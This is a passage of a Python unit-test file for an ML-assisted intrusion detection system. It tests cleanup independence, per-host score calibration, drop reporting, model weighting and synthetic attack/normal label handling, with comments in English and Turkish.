"""
tests/unit/test_retention_and_calibration.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3c: Retention / cleanup dependency tests
5a: HostCalibrationStore tests
5b: Missing integration coverage (drop visibility, model confidence)
"""

import sys
import time
import pytest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))


# -- 3c: Retention Dependency Tests -----------------------------------------

class TestRetentionMLIndependence:
    """
    Cleanup operations must not affect ML state.
    Each cleanup path is tested for what it removes and how ML depends on it.
    """

    def test_delayed_buffer_immune_to_db_cleanup(self):
        """
        DelayedLearningBuffer lives entirely in memory, so DB cleanup cannot touch it.
        When the buffer contains different keys, DB cleanup still cannot reach it.
        """
        from core.ml.learning_guard import DelayedLearningBuffer

        buf = DelayedLearningBuffer(delay_seconds=3600)  # uzun delay

        class FakeEvent:
            def __init__(self, user, ip):
                self.user = user; self.src_ip = ip
                self.action = "ssh_login"; self.ts = time.time()

        # Add 5 events with different keys
        users = ["alice", "bob", "carol", "dave", "eve"]
        for u in users:
            buf.add(FakeEvent(u, f"10.0.0.{users.index(u)+1}"), trainable=True)

        size_before = buf.size()
        assert size_before == 5

        # Simulate DB cleanup — the buffer is in memory and remains unaffected
        assert buf.size() == size_before, "DB cleanup must not affect the buffer"

    def test_alarm_mark_affects_trainability(self):
        """
        When an alarm is raised, the entity trainable flag must become False.
        This is a core ML poisoning guardrail.
        """
        from core.ml.learning_guard import DelayedLearningBuffer

        buf = DelayedLearningBuffer(delay_seconds=0)  # flush immediately

        class FakeEvt:
            user = "badguy"; src_ip = "10.0.0.1"; action = "ssh_login"; ts = time.time()

        buf.add(FakeEvt(), trainable=True)
        buf.mark_alarm("badguy")   # mark this entity as alarmed
        time.sleep(0.01)

        ready = buf.flush_ready()
        assert len(ready) == 1
        _, trainable = ready[0]
        assert trainable is False, "An alarmed entity must not remain trainable"

    def test_sequence_state_memory_sync(self):
        """
        Simulate sequence state and verify memory consistency after cleanup.
        The detection engine _state dict must not keep stale entries after cleanup.
        """
        import collections

        # Simulated detection-engine _state
        _state = collections.defaultdict(dict)
        _state["10.0.0.1"]["SEQ-001"] = {"step": 2, "last_ts": time.time() - 90000}  # stale
        _state["10.0.0.2"]["SEQ-002"] = {"step": 1, "last_ts": time.time() - 100}    # fresh

        # Only the fresh state remains in the DB (the stale one was cleaned up)
        db_fresh_state = {"10.0.0.2": {"SEQ-002": {"step": 1, "last_ts": time.time()}}}

        # 3a sync logic: remove entities from memory if they no longer exist in the DB
        stale = [e for e in _state if e not in db_fresh_state]
        for e in stale:
            del _state[e]

        assert "10.0.0.1" not in _state, "The stale sequence must be removed from memory"
        assert "10.0.0.2" in _state, "The fresh sequence must be preserved"

    def test_cross_host_lock_prevents_race(self):
        """
        3b: The cross-host lock must make persist and cleanup safe when they run concurrently.
        """
        import threading
        from core.correlation import CorrelationEngine

        # No DB needed here — this test only checks the lock behavior
        engine = CorrelationEngine(config={}, db=None)

        # Is the lock present?
        assert hasattr(engine, "_cross_host_lock"), "The cross-host lock must exist"
        assert isinstance(engine._cross_host_lock, type(threading.Lock()))

        # The lock is not re-entrant — two threads cannot enter at the same time
        results = []
        lock = engine._cross_host_lock

        def worker(idx):
            with lock:
                time.sleep(0.02)
                results.append(idx)

        t1 = threading.Thread(target=worker, args=(1,))
        t2 = threading.Thread(target=worker, args=(2,))
        t1.start(); t2.start()
        t1.join(); t2.join()

        # Both threads must finish; ordering is not guaranteed, but both must appear
        assert sorted(results) == [1, 2], "Both threads must run under the lock"

    def test_calibration_models_independent_of_db(self):
        """
        ML models (.joblib) must remain completely independent from DB cleanup.
        This test verifies filesystem-path isolation.
        """
        import tempfile
        from core.ml.calibration import HostCalibrationStore

        with tempfile.TemporaryDirectory() as tmp:
            store = HostCalibrationStore(save_dir=tmp, min_samples=5)

            # Add 10 samples
            for i in range(10):
                store.update("host1", "ml_if", float(i * 10))

            store.save()

            # Simulate DB cleanup — it does not touch the temp directory
            # The file should still exist
            calib_file = Path(tmp) / "host_calibration_store.joblib"
            assert calib_file.exists(), "The calibration file must not be affected by DB cleanup"

            # Reload — the data must still be present
            store2 = HostCalibrationStore(save_dir=tmp, min_samples=5)
            stats = store2.host_stats()
            assert "host1" in stats
            assert stats["host1"]["sample_count"] == 10


# ── 5a: HostCalibrationStore Testleri ─────────────────────────────────────────

class TestHostCalibrationStore:
    def _make_store(self, tmp_path=None):
        import tempfile
        from core.ml.calibration import HostCalibrationStore
        d = tmp_path or tempfile.mkdtemp()
        return HostCalibrationStore(save_dir=d, window_size=1000, min_samples=10)

    def test_passthrough_before_min_samples(self):
        """Return the raw score when there is not enough data."""
        store = self._make_store()
        # Only 5 samples — below min_samples=10
        for i in range(5):
            store.update("host1", "ml_if", float(i * 10))
        result = store.calibrate("host1", "ml_if", 75.0)
        assert result == 75.0, "Insufficient data should stay pass-through"

    def test_calibrate_after_sufficient_samples(self):
        """Normalize the raw score after enough data is collected."""
        store = self._make_store()
        import numpy as np
        rng = np.random.RandomState(42)
        # 20 normally distributed samples
        for _ in range(20):
            store.update("host1", "ml_if", float(rng.normal(30, 10)))
        # A score should be returned without error
        result = store.calibrate("host1", "ml_if", 75.0)
        assert isinstance(result, float)
        assert 0.0 <= result <= 100.0

    def test_different_hosts_independent(self):
        """Calibration for different hosts must remain independent."""
        store = self._make_store()
        import numpy as np

        # host1: low baseline
        for _ in range(15):
            store.update("host1", "ml_if", float(np.random.normal(20, 5)))

        # host2: high baseline (noisy)
        for _ in range(15):
            store.update("host2", "ml_if", float(np.random.normal(70, 10)))

        # The same raw score should calibrate differently across hosts
        c1 = store.calibrate("host1", "ml_if", 50.0)
        c2 = store.calibrate("host2", "ml_if", 50.0)
        # On host1, 50 should look high relative to the low baseline
        # On host2, 50 should look low relative to the high baseline
        # At minimum the results must differ
        assert c1 != c2, "The same score should calibrate differently under different baselines"

    def test_unknown_host_passthrough(self):
        """Unknown host → pass-through."""
        store = self._make_store()
        result = store.calibrate("unknown_host", "ml_if", 55.0)
        assert result == 55.0

    def test_lru_eviction(self):
        """Evict the oldest host when max_hosts is exceeded."""
        import tempfile
        from core.ml.calibration import HostCalibrationStore
        store = HostCalibrationStore(
            save_dir=tempfile.mkdtemp(), min_samples=1, max_hosts=3
        )
        # 4 distinct hosts — max_hosts=3 will be exceeded
        for i in range(4):
            store.update(f"host{i}", "ml_if", 50.0)

        assert len(store._calibrators) <= 3, "max_hosts must not be exceeded"

    def test_host_stats(self):
        """host_stats() should return the correct sample count."""
        store = self._make_store()
        for i in range(15):
            store.update("srv1", "ml_if", float(i))
        stats = store.host_stats()
        assert "srv1" in stats
        assert stats["srv1"]["sample_count"] == 15
        assert stats["srv1"]["ready"] is True

    def test_save_and_reload(self):
        """Save → reload → preserve the data."""
        import tempfile
        from core.ml.calibration import HostCalibrationStore
        d = tempfile.mkdtemp()
        store = HostCalibrationStore(save_dir=d, min_samples=5)
        for i in range(10):
            store.update("webserver", "ewma", float(i * 5))
        store.save()

        store2 = HostCalibrationStore(save_dir=d, min_samples=5)
        stats = store2.host_stats()
        assert "webserver" in stats
        assert stats["webserver"]["sample_count"] == 10


# ── 5b: Drop Visibility Integration Tests ───────────────────────────────

class TestDropVisibility:
    """
    1a/1b: Drop'ların source/priority breakdown'u doğru raporlanmalı.
    """

    def test_drop_by_priority_critical_detected(self):
        """Priority 0 (CRITICAL) drops should be detected separately."""
        # Simulate reading CRITICAL (0) from the drop_by_priority dict
        drop_by_pri = {0: 5, 1: 10, 2: 50, 3: 100, 4: 200}

        critical_drops = drop_by_pri.get(0, drop_by_pri.get("0", 0))
        assert critical_drops == 5
        assert critical_drops > 0  # CRITICAL drop uyarısı tetiklenmeli

    def test_drop_by_priority_no_critical(self):
        """No warning should fire when there is no CRITICAL drop."""
        drop_by_pri = {2: 50, 3: 100, 4: 200}
        critical_drops = drop_by_pri.get(0, drop_by_pri.get("0", 0))
        assert critical_drops == 0

    def test_drop_source_breakdown_format(self):
        """The source-breakdown string should be formatted correctly."""
        drop_by_src = {"auditd": 100, "syslog": 50, "auth.log": 30}
        top_src = sorted(drop_by_src.items(), key=lambda x: -x[1])[:3]
        breakdown = ", ".join(f"{s}={n}" for s, n in top_src)
        assert "auditd=100" in breakdown
        assert "syslog=50" in breakdown

    def test_priority_name_mapping(self):
        """Priority numbers should map to meaningful names."""
        pri_names = {0: "CRITICAL", 1: "HIGH", 2: "MEDIUM", 3: "LOW", 4: "MINIMAL"}
        drop_by_pri = {"0": 5, "2": 20, "4": 100}

        breakdown = ", ".join(
            f"{pri_names.get(int(p), p)}={n}"
            for p, n in sorted(drop_by_pri.items(), key=lambda x: int(x[0]))
        )
        assert "CRITICAL=5"  in breakdown
        assert "MEDIUM=20"   in breakdown
        assert "MINIMAL=100" in breakdown


# ── 5b: Model Confidence Integration Testleri ─────────────────────────────────

class TestModelConfidenceIntegration:
    """
    Faz geçişi + ML ağırlık dinamiği testleri.
    """

    def _grace(self, elapsed, window=7200.0):
        if elapsed <= 0: return 0.3
        if elapsed >= window: return 1.0
        return 0.3 + (elapsed / window) * 0.7

    def test_new_phase_model_starts_at_min_weight(self):
        """A new phase model should start with weight 0.3."""
        factor = self._grace(0)
        assert abs(factor - 0.3) < 0.001

    def test_grace_full_weight_at_end(self):
        """Weight should become 1.0 after the grace period expires."""
        factor = self._grace(7200)
        assert abs(factor - 1.0) < 0.001

    def test_ml_signal_weighted_by_grace(self):
        """The ML signal should be weighted by the grace factor."""
        ml_score = 80.0
        # New phase — low confidence
        weighted_early = ml_score * self._grace(0)
        # Mature phase — full confidence
        weighted_late  = ml_score * self._grace(7200)

        assert weighted_early < weighted_late
        assert abs(weighted_early - 24.0) < 0.1   # 80 * 0.3
        assert abs(weighted_late  - 80.0) < 0.1   # 80 * 1.0

    def test_old_model_higher_weight_than_new(self):
        """
        PHASE_1→2 geçişinde:
        Eski model (0.6 ağırlık, olgun) > Yeni model (0.3'ten başlıyor).
        """
        old_model_weight = 0.6 * self._grace(7200)   # olgun = 1.0 factor → 0.6
        new_model_weight = 0.6 * self._grace(0)       # fresh = 0.3 factor → 0.18

        assert old_model_weight > new_model_weight, \
            "Eski faz modeli yeni fazdan daha baskın olmalı"

    def test_if_and_baseline_conflict_rule_dominates(self):
        """
        IF anomali + baseline çakışması durumunda rule sinyal baskın olmalı.
        DEFAULT_WEIGHTS: rule_engine=1.0, ml_if=0.8, baseline_user=0.5
        """
        from core.risk import DEFAULT_WEIGHTS
        assert DEFAULT_WEIGHTS["rule_engine"] > DEFAULT_WEIGHTS["ml_if"]
        assert DEFAULT_WEIGHTS["ml_if"] > DEFAULT_WEIGHTS["baseline_user"]

    def test_host_calibration_reduces_noisy_host_score(self):
        """
        5a: Gürültülü host'tan gelen yüksek skor kalibre edildikten sonra
        düşmeli — FP azalır.
        """
        import tempfile, numpy as np
        from core.ml.calibration import HostCalibrationStore

        store = HostCalibrationStore(
            save_dir=tempfile.mkdtemp(), min_samples=15
        )
        rng = np.random.RandomState(99)

        # Noisy host — high baseline (mean 70)
        for _ in range(30):
            store.update("noisy_host", "aggregate", float(rng.normal(70, 8)))

        # Raw score 75 → effectively normal for this host
        raw = 75.0
        cal = store.calibrate("noisy_host", "aggregate", raw)

        # Calibrated score should be lower than the raw score (normalized)
        assert cal <= raw, f"Gürültülü host kalibrasyonu skoru düşürmeli: {cal} <= {raw}"

    def test_quiet_host_calibration_raises_alert_sensitivity(self):
        """
        5a: Sessiz host'ta aynı skor daha yüksek calibrate edilmeli — FN azalır.
        """
        import tempfile, numpy as np
        from core.ml.calibration import HostCalibrationStore

        store = HostCalibrationStore(
            save_dir=tempfile.mkdtemp(), min_samples=15
        )
        rng = np.random.RandomState(42)

        # Quiet host — low baseline (mean 20)
        for _ in range(30):
            store.update("quiet_host", "aggregate", float(rng.normal(20, 5)))

        # Raw score 50 → high for this host
        raw = 50.0
        cal = store.calibrate("quiet_host", "aggregate", raw)

        # Calibrated score should be higher than the raw score
        assert cal >= raw, f"Sessiz host kalibrasyonu skoru yükseltmeli: {cal} >= {raw}"


# ── 6: Hybrid Label Engine Testleri ───────────────────────────────────────────

class TestLabelEngineDistroThresholds:
    """
    Araştırma bulgularına dayanan dağıtım eşiklerini doğrular.
    Debian=50, RHEL=60, SUSE=45 — isotonic threshold=1000
    Kaynak: scikit-learn calibration docs, Caruana et al. ICML 2005
    """

    def test_debian_threshold(self):
        """Threshold should be 50 for Debian."""
        from core.ml.label_engine import DISTRO_THRESHOLDS
        assert DISTRO_THRESHOLDS["debian"] == 50

    def test_rhel_threshold_higher(self):
        """RHEL should have a higher threshold than Debian because auditd is more verbose."""
        from core.ml.label_engine import DISTRO_THRESHOLDS
        assert DISTRO_THRESHOLDS["rhel"] > DISTRO_THRESHOLDS["debian"]
        assert DISTRO_THRESHOLDS["rhel"] == 60

    def test_suse_threshold_lower(self):
        """SUSE should have a lower threshold than Debian because it has less log diversity."""
        from core.ml.label_engine import DISTRO_THRESHOLDS
        assert DISTRO_THRESHOLDS["suse"] < DISTRO_THRESHOLDS["debian"]
        assert DISTRO_THRESHOLDS["suse"] == 45

    def test_ubuntu_equals_debian(self):
        """Ubuntu is Debian-based, so the threshold should match."""
        from core.ml.label_engine import DISTRO_THRESHOLDS
        assert DISTRO_THRESHOLDS["ubuntu"] == DISTRO_THRESHOLDS["debian"]

    def test_centos_equals_rhel(self):
        """CentOS is RHEL-based, so the threshold should match."""
        from core.ml.label_engine import DISTRO_THRESHOLDS
        assert DISTRO_THRESHOLDS["centos"] == DISTRO_THRESHOLDS["rhel"]

    def test_unknown_distro_has_default(self):
        """A reasonable default threshold for unknown distros."""
        from core.ml.label_engine import DISTRO_THRESHOLDS
        assert "unknown" in DISTRO_THRESHOLDS
        assert 40 <= DISTRO_THRESHOLDS["unknown"] <= 60


class TestSyntheticLabelLoader:
    """Synthetic label loader tests."""

    def test_labels_exist_for_all_distros(self):
        """The label directory and files should exist for every distro."""
        from pathlib import Path
        base = Path("data/labels")
        for distro in ["debian", "rhel", "suse"]:
            attack_dir = base / distro / "attack"
            normal_dir = base / distro / "normal"
            assert attack_dir.exists(), f"{distro}/attack dizini eksik"
            assert normal_dir.exists(), f"{distro}/normal dizini eksik"
            # At least 3 attack categories
            attack_files = list(attack_dir.glob("*.jsonl"))
            normal_files = list(normal_dir.glob("*.jsonl"))
            assert len(attack_files) >= 3, f"{distro} en az 3 saldırı kategorisi olmalı"
            assert len(normal_files) >= 3, f"{distro} en az 3 normal kategori olmalı"

    def test_label_count_matches_threshold(self):
        """
        Her dosyadaki kayıt sayısı dağıtım eşiğiyle eşleşmeli.
        """
        from pathlib import Path
        from core.ml.label_engine import DISTRO_THRESHOLDS
        base = Path("data/labels")
        for distro, threshold in [("debian", 50), ("rhel", 60), ("suse", 45)]:
            distro_dir = base / distro
            if not distro_dir.exists():
                continue
            for jsonl in distro_dir.rglob("*.jsonl"):
                count = sum(1 for _ in open(jsonl))
                assert count == threshold, (
                    f"{jsonl}: {count} kayıt var, {threshold} olmalı"
                )

    def test_synthetic_labels_have_required_fields(self):
        """Every label record should include required fields."""
        from pathlib import Path
        import json
        required = {"action", "label", "user_group", "distro", "source"}
        base = Path("data/labels/debian")
        checked = 0
        for jsonl in base.rglob("*.jsonl"):
            for line in open(jsonl):
                record = json.loads(line)
                missing = required - set(record.keys())
                assert not missing, f"{jsonl}: eksik alanlar {missing}"
                checked += 1
                if checked >= 50:  # ilk 50 kaydı kontrol et
                    return

    def test_attack_label_is_attack(self):
        """Labels under attack/ should be marked as 'attack'."""
        from pathlib import Path
        import json
        attack_dir = Path("data/labels/debian/attack")
        if not attack_dir.exists():
            return
        for jsonl in attack_dir.glob("*.jsonl"):
            for line in open(jsonl):
                record = json.loads(line)
                assert record["label"] == "attack", f"{jsonl}: 'attack' olmalı"
            break  # ilk dosya yeterli

    def test_normal_label_is_normal(self):
        """Labels under normal/ should be marked as 'normal'."""
        from pathlib import Path
        import json
        normal_dir = Path("data/labels/debian/normal")
        if not normal_dir.exists():
            return
        for jsonl in normal_dir.glob("*.jsonl"):
            for line in open(jsonl):
                record = json.loads(line)
                assert record["label"] == "normal", f"{jsonl}: 'normal' olmalı"
            break

    def test_normal_types_match_normal_categories(self):
        """All normal_type values should match NORMAL_CATEGORIES exactly."""
        from pathlib import Path
        import json
        from core.ml.label_engine import NORMAL_CATEGORIES

        allowed = set(NORMAL_CATEGORIES)
        base = Path("data/labels")
        seen = set()

        for jsonl in base.glob("*/normal/*.jsonl"):
            for line in open(jsonl):
                record = json.loads(line)
                normal_type = record.get("normal_type")
                if normal_type:
                    seen.add(normal_type)
                    assert normal_type in allowed, (
                        f"{jsonl}: bilinmeyen normal_type '{normal_type}'"
                    )

        assert "auth_normal" in seen

    def test_placeholder_users_present(self):
        """User placeholders should appear in labels."""
        from pathlib import Path
        import json
        placeholders = {"{{admin_user}}", "{{service_user}}", "{{regular_user}}"}
        found = set()
        base = Path("data/labels/debian")
        if not base.exists():
            return
        for jsonl in base.rglob("*.jsonl"):
            for line in open(jsonl):
                record = json.loads(line)
                user = record.get("user", "")
                if user in placeholders:
                    found.add(user)
            if len(found) == len(placeholders):
                break
        assert len(found) > 0, "En az bir placeholder kullanıcı bulunmalı"

    def test_loader_replaces_placeholder_users(self):
        """
        SyntheticLabelLoader user_map ile placeholder'ları değiştirmeli.
        """
        import tempfile, json
        from pathlib import Path
        from core.ml.label_engine import SyntheticLabelLoader

        with tempfile.TemporaryDirectory() as tmp:
            # Create a simple test label directory
            attack_dir = Path(tmp) / "debian" / "attack"
            attack_dir.mkdir(parents=True)
            record = {
                "action": "ssh_login", "label": "attack",
                "user": "{{admin_user}}", "user_group": "admin",
                "distro": "debian", "source": "auth.log",
                "ts": 1700000000.0
            }
            (attack_dir / "test.jsonl").write_text(json.dumps(record) + "\n")

            loader = SyntheticLabelLoader(labels_dir=tmp, distro_family="debian")
            records = loader.load(user_map={"{{admin_user}}": "johndoe"})
            assert len(records) == 1
            assert records[0].entity_key == "johndoe", "Placeholder değiştirilmeli"


class TestLabelEngineWeightLifecycle:
    """
    Etiket ağırlık yaşam döngüsü testleri.
    synthetic(0.50) + bootstrap(0.65) → lineer azalma → 0.0
    Üç kaynak: synthetic, bootstrap, auto_labeled
    """

    def _make_engine(self):
        from core.ml.label_engine import LabelEngine
        return LabelEngine(distro_family="debian", labels_dir="data/labels")

    def test_initial_weights_correct(self):
        """Initial values should be synthetic=0.50 and bootstrap=0.65, not 1.0 anymore."""
        from core.ml.label_engine import (LabelEngine,
            SOURCE_BASE_WEIGHTS, SOURCE_SYNTHETIC, SOURCE_BOOTSTRAP)
        engine = self._make_engine()
        assert engine._synthetic_weight == SOURCE_BASE_WEIGHTS[SOURCE_SYNTHETIC]
        assert engine._bootstrap_weight == SOURCE_BASE_WEIGHTS[SOURCE_BOOTSTRAP]
        assert engine._synthetic_weight == 0.50
        assert engine._bootstrap_weight == 0.65

    def test_synthetic_linear_decay(self):
        """
        Synthetic weight lineer azalmalı — ratio 1.0 olduğunda yarıya inmeli.
        ratio=1.0 → weight = 0.50 * (1 - 1.0/2.0) = 0.25
        """
        from core.ml.label_engine import LabelEngine, SYNTHETIC_RETIRE_AT_RATIO

        engine = self._make_engine()
        engine._synthetic_records = [None] * 10  # 10 synthetic

        class FakeAutoLabeler:
            count = 10   # ratio = 10/10 = 1.0
            def get_ready_records(self): return []
        engine._auto_labeler = FakeAutoLabeler()

        engine._update_weights()
        expected = 0.50 * (1.0 - 1.0 / SYNTHETIC_RETIRE_AT_RATIO)  # 0.25
        assert abs(engine._synthetic_weight - expected) < 0.001, \
            f"Beklenen {expected:.3f}, alınan {engine._synthetic_weight:.3f}"

    def test_synthetic_retires_at_2x(self):
        """auto/synthetic = 2.0 should drive synthetic weight to exactly 0.0."""
        from core.ml.label_engine import LabelEngine, SYNTHETIC_RETIRE_AT_RATIO

        engine = self._make_engine()
        engine._synthetic_records = [None] * 10

        class FakeAutoLabeler:
            count = 20   # ratio = 2.0
            def get_ready_records(self): return []
        engine._auto_labeler = FakeAutoLabeler()

        engine._update_weights()
        assert engine._synthetic_weight == 0.0, "2x oranında synthetic sıfırlanmalı"

    def test_bootstrap_linear_decay(self):
        """
        Bootstrap weight lineer azalmalı.
        ratio=1.5 → weight = 0.65 * (1 - 1.5/3.0) = 0.325
        """
        from core.ml.label_engine import LabelEngine, BOOTSTRAP_RETIRE_AT_RATIO

        engine = self._make_engine()
        engine._synthetic_records = [None] * 10
        engine._bootstrap_records = [None] * 10

        class FakeAutoLabeler:
            count = 15   # auto/bootstrap = 1.5, auto/synthetic = 1.5
            def get_ready_records(self): return []
        engine._auto_labeler = FakeAutoLabeler()

        engine._update_weights()
        expected_boot = 0.65 * (1.0 - 1.5 / BOOTSTRAP_RETIRE_AT_RATIO)  # 0.325
        assert abs(engine._bootstrap_weight - expected_boot) < 0.001, \
            f"Beklenen {expected_boot:.3f}, alınan {engine._bootstrap_weight:.3f}"

    def test_bootstrap_retires_at_3x(self):
        """auto/bootstrap = 3.0 should drive bootstrap weight to exactly 0.0."""
        from core.ml.label_engine import LabelEngine

        engine = self._make_engine()
        engine._synthetic_records = [None] * 5
        engine._bootstrap_records = [None] * 10

        class FakeAutoLabeler:
            count = 30   # auto/bootstrap = 3.0
            def get_ready_records(self): return []
        engine._auto_labeler = FakeAutoLabeler()

        engine._update_weights()
        assert engine._bootstrap_weight == 0.0, "3x oranında bootstrap sıfırlanmalı"

    def test_auto_normal_does_not_reduce_synthetic_attack_weight(self):
        """Growth in auto_normal should not trigger synthetic-attack retirement."""
        from core.ml.label_engine import LabelEngine, LabelRecord, SOURCE_SYNTHETIC

        engine = self._make_engine()
        engine._synthetic_records = [
            LabelRecord(80.0, "attack", "brute_force", SOURCE_SYNTHETIC, confidence=1.0, weight=0.45)
            for _ in range(10)
        ]

        class FakeAutoLabeler:
            count = 10
            def count_by_label(self, label):
                return 10 if label == "normal" else 0
            def get_ready_records(self): return []

        engine._auto_labeler = FakeAutoLabeler()
        engine._update_weights()
        assert abs(engine._synthetic_attack_weight - 0.50) < 0.001

    def test_auto_attack_does_not_reduce_synthetic_normal_weight(self):
        """Growth in auto_attack should not trigger synthetic-normal retirement."""
        from core.ml.label_engine import LabelEngine, LabelRecord, SOURCE_SYNTHETIC

        engine = self._make_engine()
        engine._synthetic_records = [
            LabelRecord(20.0, "normal", "auth_normal", SOURCE_SYNTHETIC, confidence=1.0, weight=0.55)
            for _ in range(10)
        ]

        class FakeAutoLabeler:
            count = 10
            def count_by_label(self, label):
                return 10 if label == "attack" else 0
            def get_ready_records(self): return []

        engine._auto_labeler = FakeAutoLabeler()
        engine._update_weights()
        assert abs(engine._synthetic_normal_weight - 0.50) < 0.001

    def test_same_label_synthetic_retirement_still_applies(self):
        """Synthetic retirement should still behave the same way on the same label side."""
        from core.ml.label_engine import LabelEngine, LabelRecord, SOURCE_SYNTHETIC

        engine = self._make_engine()
        engine._synthetic_records = [
            LabelRecord(80.0, "attack", "brute_force", SOURCE_SYNTHETIC, confidence=1.0, weight=0.45)
            for _ in range(10)
        ]

        class FakeAutoLabeler:
            count = 10
            def count_by_label(self, label):
                return 10 if label == "attack" else 0
            def get_ready_records(self): return []

        engine._auto_labeler = FakeAutoLabeler()
        engine._update_weights()
        assert abs(engine._synthetic_attack_weight - 0.25) < 0.001

    def test_weights_never_go_negative(self):
        """Weight must never become negative even when the ratio is very high."""
        from core.ml.label_engine import LabelEngine

        engine = self._make_engine()
        engine._synthetic_records = [None] * 10
        engine._bootstrap_records = [None] * 10

        class FakeAutoLabeler:
            count = 9999
            def get_ready_records(self): return []
        engine._auto_labeler = FakeAutoLabeler()

        engine._update_weights()
        assert engine._synthetic_weight >= 0.0
        assert engine._bootstrap_weight >= 0.0

    def test_three_sources_in_status(self):
        """status() should return three source types."""
        from core.ml.label_engine import (LabelEngine,
            SOURCE_SYNTHETIC, SOURCE_BOOTSTRAP,
            SOURCE_AUTO_LABELED)
        engine = self._make_engine()
        s = engine.status()
        assert "sources" in s
        for src in [SOURCE_SYNTHETIC, SOURCE_BOOTSTRAP, SOURCE_AUTO_LABELED]:
            assert src in s["sources"], f"'{src}' sources içinde olmalı"

    def test_calibration_data_excludes_zero_weight(self):
        """Sources with zero weight must not enter calibration data."""
        from core.ml.label_engine import (LabelEngine, LabelRecord,
                                           SOURCE_SYNTHETIC)
        engine = self._make_engine()
        engine._synthetic_records = [
            LabelRecord(80.0, "attack", "brute_force", SOURCE_SYNTHETIC,
                        confidence=1.0, weight=0.50)
        ]
        engine._synthetic_weight = 0.0  # devre dışı
        data = engine.get_calibration_data()
        assert len(data) == 0, "weight=0 kaynaklar kalibrasyona girmemeli"

    def test_synthetic_attack_effective_weight_is_045(self):
        """The synthetic-attack seed-weight constant should remain 0.45."""
        from core.ml.label_engine import SYNTHETIC_ATTACK_BASE_WEIGHT

        assert abs(SYNTHETIC_ATTACK_BASE_WEIGHT - 0.45) < 0.001

    def test_synthetic_normal_effective_weight_is_055(self):
        """The synthetic-normal seed-weight constant should remain 0.55."""
        from core.ml.label_engine import SYNTHETIC_NORMAL_BASE_WEIGHT

        assert abs(SYNTHETIC_NORMAL_BASE_WEIGHT - 0.55) < 0.001

    def test_calibration_data_excludes_synthetic_high_and_not_learnable_unknown(self):
        """synthetic_high must stay out of runtime calibration, and not-learnable/unknown should still be excluded."""
        from core.ml.label_engine import (
            LabelRecord,
            SOURCE_SYNTHETIC,
            SOURCE_BOOTSTRAP,
            SOURCE_AUTO_LABELED,
        )

        engine = self._make_engine()
        engine._synthetic_records = [
            LabelRecord(
                50.0, "attack", "brute_force_success", SOURCE_SYNTHETIC,
                confidence=1.0, weight=0.45,
                event_class="attack",
                behavior_label="brute_force_success",
                attack_family="brute_force_success",
                technique_label="brute_force_success",
                source_trust="synthetic_high",
                learnable=True,
                model_usage_scope="calibration_only",
            )
        ]
        engine._bootstrap_records = [
            LabelRecord(
                88.0, "attack", "brute_force", SOURCE_BOOTSTRAP,
                confidence=1.0, weight=0.65,
                event_class="attack",
                behavior_label="brute_force",
                attack_family="brute_force",
                technique_label="brute_force",
                source_trust="rule_high",
                learnable=True,
                model_usage_scope="calibration_only",
            ),
            LabelRecord(
                25.0, "normal", "auth_normal", SOURCE_BOOTSTRAP,
                confidence=1.0, weight=0.65,
                event_class="benign",
                behavior_label="expected_auth_activity",
                technique_label="auth_normal",
                source_trust="observed_benign_high",
                learnable=True,
                model_usage_scope="calibration_only",
            ),
            LabelRecord(
                40.0, "normal", "package_management", SOURCE_BOOTSTRAP,
                confidence=1.0, weight=0.65,
                event_class="benign",
                behavior_label="benign_activity",
                technique_label="package_management",
                source_trust="observed_benign_medium",
                learnable=False,
                model_usage_scope="not_learnable",
            ),
            LabelRecord(
                60.0, "attack", "unknown", SOURCE_BOOTSTRAP,
                confidence=1.0, weight=0.65,
                event_class="unknown_unlabeled",
                behavior_label="unknown_unlabeled",
                source_trust="rule_high",
                learnable=False,
                model_usage_scope="not_learnable",
            ),
        ]
        engine._auto_labeler._records = [
            LabelRecord(
                91.0, "attack", "lateral_movement", SOURCE_AUTO_LABELED,
                confidence=0.91, weight=0.91, ready_after=0.0,
                event_class="attack",
                behavior_label="lateral_movement",
                attack_family="lateral_movement",
                technique_label="lateral_movement",
                source_trust="sequence_high",
                learnable=True,
                model_usage_scope="calibration_only",
            )
        ]

        data = engine.get_calibration_data()

        assert len(data) == 3
        labels = sorted(label for _, label, _ in data)
        assert labels == [0, 1, 1]
        weights = sorted(round(weight, 2) for _, _, weight in data)
        assert weights == [0.65, 0.65, 0.91]

    def test_unmapped_bootstrap_rules_stay_not_learnable_and_out_of_calibration(self):
        """ATK-PE-001 / DISC-002 / FIRST-002 must remain not-learnable until future mapping is enabled."""
        from core.ml.label_engine import (
            LabelRecord,
            SOURCE_BOOTSTRAP,
            _bootstrap_rule_metadata,
        )

        engine = self._make_engine()
        bootstrap_records = []

        for rule_id in ("ATK-PE-001", "DISC-002", "FIRST-002"):
            canonical = _bootstrap_rule_metadata(rule_id, "attack", "auth")
            assert canonical["event_class"] == "unknown_unlabeled"
            assert canonical["behavior_label"] == "unknown_unlabeled"
            assert canonical["model_usage_scope"] == "not_learnable"
            assert canonical["learnable"] is False
            assert canonical["label_reason"] == "bootstrap_rule_unmapped"
            bootstrap_records.append(
                LabelRecord(
                    55.0, "attack", "unknown_attack", SOURCE_BOOTSTRAP,
                    confidence=1.0, weight=0.65,
                    event_class=canonical["event_class"],
                    behavior_label=canonical["behavior_label"],
                    attack_family=canonical["attack_family"],
                    technique_label=canonical["technique_label"],
                    source_trust=canonical["source_trust"],
                    learnable=canonical["learnable"],
                    model_usage_scope=canonical["model_usage_scope"],
                    label_reason=canonical["label_reason"],
                    evidence_fields=canonical["evidence_fields"],
                )
            )

        engine._bootstrap_records = bootstrap_records

        assert engine.get_calibration_data() == []

    @pytest.mark.parametrize(
        "rule_id, category",
        [
            ("ATK-PE-001", "auth"),
            ("DISC-002", "discovery"),
            ("FIRST-002", "auth"),
            ("ATK-LM-001", "auth"),
            ("NET-001", "network"),
            ("AUTH-014", "auth"),
        ],
    )
    def test_dual_use_and_context_rules_stay_not_learnable_unlearnable(self, rule_id, category):
        from core.ml.label_engine import _bootstrap_rule_metadata

        canonical = _bootstrap_rule_metadata(rule_id, "attack", category)

        assert canonical["event_class"] == "unknown_unlabeled"
        assert canonical["behavior_label"] == "unknown_unlabeled"
        assert canonical["model_usage_scope"] == "not_learnable"
        assert canonical["learnable"] is False
        assert canonical["label_reason"] == "bootstrap_rule_unmapped"

    @pytest.mark.parametrize(
        "rule_id, category, behavior_label, attack_family, technique_label, reason",
        [
